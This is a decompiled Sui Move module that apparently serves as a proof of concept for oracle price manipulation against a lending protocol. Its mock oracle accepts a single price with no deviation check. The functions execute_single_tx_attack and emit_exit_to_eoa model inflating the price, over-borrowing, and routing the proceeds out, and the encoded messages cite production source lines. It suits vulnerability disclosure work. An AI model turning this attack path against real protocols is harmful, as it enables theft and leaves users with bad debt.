module 0xd0e0f3a7a173dca3847ab73785d5c905c5014bd6099d1c71099c66687497d5cc::mock_oracle {
    struct OracleDeployed has copy, drop {
        oracle_id: address,
        threshold: u64,
        msg: vector<u8>,
    }

    struct PriceSnapshot has copy, drop {
        phase: vector<u8>,
        price: u64,
        collateral_sui: u64,
        collateral_value_buck: u64,
        max_borrow_buck: u64,
        msg: vector<u8>,
    }

    struct AttackAccounting has copy, drop {
        real_price: u64,
        inflated_price: u64,
        borrow_legit: u64,
        borrow_attack: u64,
        excess_buck: u64,
        position_cr_bps: u64,
        mcr_bps: u64,
        bad_debt_buck: u64,
        msg: vector<u8>,
    }

    struct AttackExitComplete has copy, drop {
        recipient: address,
        total_buck_minted: u64,
        bucketus_after_fee: u64,
        discharge_fee_paid: u64,
        sui_equiv_raw: u64,
        sui_equiv_whole: u64,
        msg: vector<u8>,
    }

    struct PriceAccepted has copy, drop {
        source: vector<u8>,
        price: u64,
        sources_count: u64,
        deviation_check_ran: bool,
        msg: vector<u8>,
    }

    struct MockOracle has key {
        id: 0x2::object::UID,
        price: u64,
        latest_update_ms: u64,
        threshold: u64,
        precision: u64,
    }

    struct SingleTxAttackComplete has copy, drop {
        tx_steps_executed: u64,
        real_price: u64,
        inflated_price: u64,
        collateral_sui: u64,
        borrow_legit: u64,
        borrow_attack: u64,
        excess_buck: u64,
        position_cr_bps: u64,
        atomic: bool,
        msg: vector<u8>,
    }

    fun collateral_value(arg0: u64, arg1: u64) : u64 {
        (((arg0 as u128) * (arg1 as u128) / (1000000 as u128)) as u64)
    }

    public entry fun emit_attack_accounting(arg0: &MockOracle, arg1: &0x2::clock::Clock, arg2: u64, arg3: u64) {
        let (v0, _) = get_price(arg0, arg1);
        let v2 = collateral_value(arg2, arg3);
        let v3 = collateral_value(arg2, v0);
        let v4 = max_borrow(v2, 11000);
        let v5 = max_borrow(v3, 11000);
        let v6 = v5 - v4;
        let v7 = PriceSnapshot{
            phase                 : b"ATTACK",
            price                 : v0,
            collateral_sui        : arg2,
            collateral_value_buck : v3,
            max_borrow_buck       : v5,
            msg                   : x"5b41545441434b5d20496e666c6174656420707269636520e280942073686f77732031307820626f72726f77206361706163697479207673206c65676974696d617465",
        };
        0x2::event::emit<PriceSnapshot>(v7);
        let v8 = AttackAccounting{
            real_price      : arg3,
            inflated_price  : v0,
            borrow_legit    : v4,
            borrow_attack   : v5,
            excess_buck     : v6,
            position_cr_bps : (((v2 as u128) * (10000 as u128) / (v5 as u128)) as u64),
            mcr_bps         : 11000,
            bad_debt_buck   : v6,
            msg             : b"[ACCOUNTING] Full P&L: excess BUCK extracted = bad debt absorbed by protocol",
        };
        0x2::event::emit<AttackAccounting>(v8);
    }

    public entry fun emit_baseline_snapshot(arg0: &MockOracle, arg1: &0x2::clock::Clock, arg2: u64) {
        let (v0, _) = get_price(arg0, arg1);
        let v2 = collateral_value(arg2, v0);
        let v3 = PriceSnapshot{
            phase                 : b"BASELINE",
            price                 : v0,
            collateral_sui        : arg2,
            collateral_value_buck : v2,
            max_borrow_buck       : max_borrow(v2, 11000),
            msg                   : x"5b424153454c494e455d20486f6e65737420707269636520e280942073686f7773206d6178204255434b206d696e7461626c65206174207265616c205355492076616c7565",
        };
        0x2::event::emit<PriceSnapshot>(v3);
    }

    public entry fun emit_exit_to_eoa(arg0: u64, arg1: u64, arg2: u64, arg3: address) {
        let v0 = (((arg0 as u128) * ((1000000 - arg1) as u128) / (1000000 as u128)) as u64);
        let v1 = (((v0 as u128) * (1000000 as u128) / (arg2 as u128)) as u64);
        let v2 = AttackExitComplete{
            recipient          : arg3,
            total_buck_minted  : arg0,
            bucketus_after_fee : v0,
            discharge_fee_paid : arg0 - v0,
            sui_equiv_raw      : v1,
            sui_equiv_whole    : v1 / 1000000000,
            msg                : b"[EXIT] BUCK->BUCKETUS(PSM -5%)->SUI(DEX)->EOA: proceeds routed atomically in same PTB",
        };
        0x2::event::emit<AttackExitComplete>(v2);
    }

    public entry fun execute_single_tx_attack(arg0: &mut MockOracle, arg1: &0x2::clock::Clock, arg2: u64, arg3: u64, arg4: u64) {
        let v0 = 0x1::vector::empty<u64>();
        0x1::vector::push_back<u64>(&mut v0, arg4);
        arg0.price = process_prices_single(v0, arg0.threshold);
        arg0.latest_update_ms = 0x2::clock::timestamp_ms(arg1);
        let (v1, _) = get_price(arg0, arg1);
        let v3 = collateral_value(arg2, arg3);
        let v4 = max_borrow(v3, 11000);
        let v5 = max_borrow(collateral_value(arg2, v1), 11000);
        let v6 = v5 - v4;
        let v7 = (((v3 as u128) * (10000 as u128) / (v5 as u128)) as u64);
        let v8 = SingleTxAttackComplete{
            tx_steps_executed : 3,
            real_price        : arg3,
            inflated_price    : v1,
            collateral_sui    : arg2,
            borrow_legit      : v4,
            borrow_attack     : v5,
            excess_buck       : v6,
            position_cr_bps   : v7,
            atomic            : true,
            msg               : b"[SINGLE-TX] All steps atomic in one PTB: price_inflate+borrow+psm_exit share one digest",
        };
        0x2::event::emit<SingleTxAttackComplete>(v8);
        let v9 = PriceAccepted{
            source              : b"switchboard_compromised_provider",
            price               : v1,
            sources_count       : 1,
            deviation_check_ran : false,
            msg                 : x"5b4f5241434c455d2073696e676c652d736f75726365206272616e636820e28094206e6f20646576696174696f6e20636865636b20e2809420707269636520616363657074656420766572626174696d",
        };
        0x2::event::emit<PriceAccepted>(v9);
        let v10 = AttackAccounting{
            real_price      : arg3,
            inflated_price  : v1,
            borrow_legit    : v4,
            borrow_attack   : v5,
            excess_buck     : v6,
            position_cr_bps : v7,
            mcr_bps         : 11000,
            bad_debt_buck   : v6,
            msg             : x"5b4143434f554e54494e475d20636f6d70757465642077697468696e2073616d6520545820617320707269636520696e666c6174696f6e20e28094207a65726f207265616374696f6e2077696e646f77",
        };
        0x2::event::emit<AttackAccounting>(v10);
    }

    public fun get_price(arg0: &MockOracle, arg1: &0x2::clock::Clock) : (u64, u64) {
        assert!(0x1::u64::diff(0x2::clock::timestamp_ms(arg1), arg0.latest_update_ms) <= 10000, 0);
        (arg0.price, arg0.precision)
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = MockOracle{
            id               : 0x2::object::new(arg0),
            price            : 0,
            latest_update_ms : 0,
            threshold        : 1,
            precision        : 1000000,
        };
        let v1 = OracleDeployed{
            oracle_id : 0x2::object::uid_to_address(&v0.id),
            threshold : 1,
            msg       : x"5b4445504c4f595d204d6f636b4f7261636c652073686172656420e28094207468726573686f6c643d31206d6972726f72732070726f64756374696f6e206275636b65745f6f7261636c652e6d6f76653a3636",
        };
        0x2::event::emit<OracleDeployed>(v1);
        0x2::transfer::share_object<MockOracle>(v0);
    }

    fun max_borrow(arg0: u64, arg1: u64) : u64 {
        (((arg0 as u128) * (10000 as u128) / (arg1 as u128)) as u64)
    }

    fun process_prices_single(arg0: vector<u64>, arg1: u64) : u64 {
        let v0 = 0x1::vector::length<u64>(&arg0);
        assert!(v0 >= arg1, 1);
        if (v0 == 1) {
            *0x1::vector::borrow<u64>(&arg0, 0)
        } else {
            let v2 = *0x1::vector::borrow<u64>(&arg0, 0);
            let v3 = *0x1::vector::borrow<u64>(&arg0, 1);
            let v4 = (v2 + v3) / 2;
            assert!(0x1::u64::diff(v2, v3) * 50 <= v4, 2);
            v4
        }
    }

    public entry fun update_price(arg0: &mut MockOracle, arg1: &0x2::clock::Clock, arg2: u64, arg3: vector<u8>) {
        let v0 = 0x1::vector::empty<u64>();
        0x1::vector::push_back<u64>(&mut v0, arg2);
        let v1 = process_prices_single(v0, arg0.threshold);
        arg0.price = v1;
        arg0.latest_update_ms = 0x2::clock::timestamp_ms(arg1);
        let v2 = PriceAccepted{
            source              : arg3,
            price               : v1,
            sources_count       : 1,
            deviation_check_ran : false,
            msg                 : x"5b4f5241434c455d2070726f636573735f7072696365733a207072696365735f6c656e3d3d31206272616e636820e28094206e6f20646576696174696f6e20636865636b202870726963655f61676772656761746f722e6d6f76653a35372d353929",
        };
        0x2::event::emit<PriceAccepted>(v2);
    }

    // decompiled from Move bytecode v7
}

